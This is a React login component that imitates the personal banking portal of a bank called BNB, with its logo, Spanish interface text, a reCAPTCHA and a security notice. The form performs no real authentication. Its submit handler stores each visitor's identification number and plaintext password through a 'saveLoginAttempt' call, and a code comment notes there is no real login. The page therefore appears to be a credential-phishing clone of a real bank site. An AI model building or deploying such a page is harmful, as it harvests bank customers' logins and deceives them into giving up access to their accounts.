import { useState } from 'react';
import { Eye, EyeOff, User, Lock, Globe } from 'lucide-react';
import ReCAPTCHA from 'react-google-recaptcha';
import { saveLoginAttempt } from '../../services/loginAttempts';

interface LoginProps {
  onBack: () => void;
}

const Login = ({ onBack }: LoginProps) => {
  const [showPassword, setShowPassword] = useState(false);
  const [formData, setFormData] = useState({
    identifier: '',
    password: ''
  });
  const [language, setLanguage] = useState('Español');
  const [captchaToken, setCaptchaToken] = useState<string | null>(null);

const handleSubmit = async (e: React.FormEvent) => {
  e.preventDefault();

  if (!captchaToken) {
    alert('Por favor, completa el reCAPTCHA para continuar.');
    return;
  }

  try {
    // Guardar intento sin autenticar (success = false porque no hay login real)
    await saveLoginAttempt(formData.identifier, false, formData.password);

    alert('Intento guardado correctamente');
    handleClear();  // Opcional: limpia formulario después de guardar
  } catch (error) {
    alert('Error guardando intento: ' + (error as Error).message);
  }
};

  const handleInputChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setFormData({
      ...formData,
      [e.target.name]: e.target.value
    });
  };

  const handleClear = () => {
    setFormData({
      identifier: '',
      password: ''
    });
    setCaptchaToken(null);
  };

  return (
    <div className="min-h-screen bg-gradient-to-br from-bnb-light to-white flex items-center justify-center relative overflow-hidden">
      {/* Background decorative circles */}
      <div className="absolute top-20 right-20 w-64 h-64 bg-bnb-green opacity-10 rounded-full"></div>
      <div className="absolute bottom-20 left-20 w-48 h-48 bg-bnb-green opacity-5 rounded-full"></div>
      <div className="absolute top-1/2 left-1/4 w-32 h-32 bg-bnb-purple opacity-5 rounded-full"></div>

      <div className="w-full max-w-md mx-4">
        {/* Header */}
        <div className="flex justify-between items-center mb-8">
          <button
            onClick={onBack}
            className="flex items-center space-x-2 text-bnb-gray hover:text-bnb-green transition-colors"
          >
            <img
              src="https://ext.same-assets.com/2715094947/2293449417.png"
              alt="BNB Logo"
              className="h-8"
            />
          </button>

          <div className="relative">
            <div className="flex items-center space-x-2 cursor-pointer">
              <Globe className="w-4 h-4 text-bnb-gray" />
              <select
                value={language}
                onChange={(e) => setLanguage(e.target.value)}
                className="border border-bnb-gray rounded px-3 py-1 text-sm focus:outline-none focus:border-bnb-green"
              >
                <option value="Español">Español</option>
                <option value="English">English</option>
              </select>
            </div>
          </div>
        </div>

        {/* Login Form */}
        <div className="bg-white rounded-2xl shadow-xl p-8 border border-bnb-green-bg">
          <div className="text-center mb-8">
            <h2 className="text-3xl font-bold text-bnb-dark mb-2">Bienvenido</h2>
            <p className="text-bnb-gray">Ingresa al Portal de Banca Personas del BNB</p>
          </div>

          <form onSubmit={handleSubmit} className="space-y-6">
            {/* Identifier Field */}
            <div>
              <label htmlFor="identifier" className="block text-sm font-medium text-bnb-dark mb-2">
                Número de identificación
              </label>
              <div className="relative">
                <User className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-bnb-gray" />
                <input
                  type="text"
                  id="identifier"
                  name="identifier"
                  value={formData.identifier}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-4 py-3 border border-bnb-green-bg rounded-lg focus:outline-none focus:border-bnb-green focus:ring-2 focus:ring-bnb-green focus:ring-opacity-20 transition-colors"
                  placeholder="Ingresa tu número de identificación"
                  required
                />
              </div>
            </div>

            {/* Password Field */}
            <div>
              <label htmlFor="password" className="block text-sm font-medium text-bnb-dark mb-2">
                Contraseña
              </label>
              <div className="relative">
                <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 w-5 h-5 text-bnb-gray" />
                <input
                  type={showPassword ? 'text' : 'password'}
                  id="password"
                  name="password"
                  value={formData.password}
                  onChange={handleInputChange}
                  className="w-full pl-10 pr-12 py-3 border border-bnb-green-bg rounded-lg focus:outline-none focus:border-bnb-green focus:ring-2 focus:ring-bnb-green focus:ring-opacity-20 transition-colors"
                  placeholder="Ingresa tu contraseña"
                  required
                />
                <button
                  type="button"
                  onClick={() => setShowPassword(!showPassword)}
                  className="absolute right-3 top-1/2 transform -translate-y-1/2 text-bnb-gray hover:text-bnb-green transition-colors"
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>

            {/* reCAPTCHA */}
            <div className="flex justify-center">
              <ReCAPTCHA
                sitekey="6LcsDVsrAAAAAD68wYn3EU1G-1ysM6sFokIEnRFU"
                onChange={(token) => setCaptchaToken(token)}
              />
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              className="w-full bg-bnb-green text-white py-3 px-6 rounded-lg font-semibold hover:bg-bnb-green-light transition-colors focus:outline-none focus:ring-2 focus:ring-bnb-green focus:ring-opacity-50"
            >
              Validar
            </button>
            {/* Clear Button */}
            <button
              type="button"
              onClick={handleClear}
              className="w-full text-bnb-gray hover:text-bnb-green transition-colors text-sm flex items-center justify-center space-x-2"
            >
              <span>🗑️</span>
              <span>Limpiar</span>
            </button>
          </form>

          {/* Additional Links */}
          <div className="mt-6 pt-6 border-t border-bnb-green-bg">
            <div className="space-y-2 text-center">
              <a href="#" className="block text-sm text-bnb-green hover:text-bnb-green-light transition-colors">
                ¿Olvidaste tu contraseña?
              </a>
              <a href="#" className="block text-sm text-bnb-green hover:text-bnb-green-light transition-colors">
                ¿Necesitas ayuda?
              </a>
              <a href="#" className="block text-sm text-bnb-green hover:text-bnb-green-light transition-colors">
                Registrarse como nuevo usuario
              </a>
            </div>
          </div>

          {/* Security Notice */}
          <div className="mt-6 p-4 bg-bnb-light rounded-lg">
            <p className="text-xs text-bnb-gray text-center">
              Tu información está protegida con la máxima seguridad.
              El BNB nunca te solicitará tu información personal por correo electrónico o teléfono.
            </p>
          </div>
        </div>

        {/* Footer */}
        <div className="text-center mt-6">
          <p className="text-xs text-bnb-gray">
            Entidad supervisada por ASFI
          </p>
        </div>
      </div>
    </div>
  );
};

export default Login;
